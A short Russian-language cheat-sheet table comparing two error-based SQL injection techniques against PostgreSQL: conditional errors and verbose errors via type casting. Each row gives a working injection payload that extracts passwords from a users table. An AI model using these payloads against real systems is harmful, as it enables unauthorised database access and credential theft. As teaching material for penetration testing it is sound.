...
| Тип | Что это | Когда использовать | Пример (PostgreSQL) |
| :--- | :--- | :--- | :--- |
| **Условные ошибки** | Ты вызываешь ошибку **только если условие истинно** и смотришь на разницу в ответе (`500` vs `200`). | Когда ошибки **видны**, но **нет вывода данных**. | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1` |
| **Подробные ошибки** | Ты заставляешь БД **выдать данные прямо в тексте ошибки** через преобразование типов (`CAST` / `::int`). | Когда ошибки **видны** и **содержат полный текст ошибки БД**. | `'||(SELECT password FROM users LIMIT 1)::int||'` |
